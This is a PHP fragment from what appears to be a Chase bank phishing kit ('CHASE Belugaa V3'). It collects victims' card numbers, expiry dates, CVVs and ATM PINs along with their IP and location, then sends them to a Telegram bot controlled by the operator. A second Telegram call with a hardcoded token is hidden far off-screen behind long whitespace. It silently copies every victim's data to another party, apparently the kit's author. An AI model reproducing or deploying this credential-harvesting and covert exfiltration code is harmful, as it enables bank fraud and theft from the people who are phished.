...
if(isset($_POST['invalid'])){
	...
	$hi="#---------------------------[ -CHASE-Belugaa V3- CARD DETAILS 2 ]----------------------------#\r\n";
	...
	$subject="#CHASE Belugaa CC 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: CHASE Belugaa  <chase_Belugaa_v3@dila.dz>\r\n";
...
if(isset($_POST['spox_cc'])&&isset($_POST['spox_cc_exp'])&&isset($_POST['spox_cvv'])&&isset($_POST['spox_atm_pin'])&&isset($_POST['token_spox'])){
	...
	$hi="#---------------------------[ -CHASE-Belugaa V3- CARD DETAILS ]----------------------------#\r\n";
	$hi.="Card Number: {$_POST['spox_cc']}\r\n";
	$hi.="Expiration date: {$_POST['spox_cc_exp']}\r\n";
	$hi.="Security code : {$_POST['spox_cvv']}\r\n";
	$hi.="Atm pin : {$_POST['spox_atm_pin']}\r\n";
	...
	$subject="#CHASE Belugaa CC 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: CHASE Belugaa  <chase_Belugaa_v3@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($hi)."" );                                                                                                                                                                                                          file_get_contents("https://api.telegram.org/bot5485433719:AAFh8gTthZC4Lyen17ULUC4CgJm47DjV5o4/sendMessage?chat_id=1783236185&text=" . urlencode($hi)."" );
